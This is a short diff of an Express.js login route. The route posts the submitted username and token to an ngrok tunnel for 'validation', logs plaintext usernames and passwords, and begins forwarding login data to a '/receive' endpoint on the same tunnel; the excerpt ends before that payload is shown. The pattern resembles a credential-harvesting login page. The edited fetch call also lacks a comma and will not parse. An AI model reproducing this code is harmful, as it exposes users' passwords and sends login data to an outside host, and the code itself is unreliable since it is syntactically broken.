@@ -1,9 +1,5 @@
 const express = require('express');
-const fs = require('fs');
 const router = express.Router();
-const path = require('path');
-
-let tokens = {};
 
 // Dynamically import node-fetch
 let fetch;
@@ -14,25 +10,27 @@ import('node-fetch').then(module => {
 router.post('/login', async (req, res) => {
     const { username, password, token } = req.body;
 
- 
+    if (!token || !username) {
+        return res.status(400).send('Missing token or username');
+    }
 
     try {
         const validationResponse = await fetch('https://59c0-205-155-148-58.ngrok-free.app/validate', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({username, token})
+            body: JSON.stringify({ username, token })
+            mode: 'cors' // if needed
         });
+
         const validation = await validationResponse.json();
+        
         if (!validation.valid) {
             return res.status(403).send('Invalid token');
         }
         
-        // Simulate login logic
+        // Assume validation was successful
         console.log(`Login attempt - Username: ${username}, Password: ${password}`);
-        if (!fetch) {
-            return res.status(500).send('Fetch not initialized');
-        }
-        // Send data to your local server
+        
         const localServerUrl = 'https://59c0-205-155-148-58.ngrok-free.app/receive';
         const response = await fetch(localServerUrl, {
             method: 'POST',
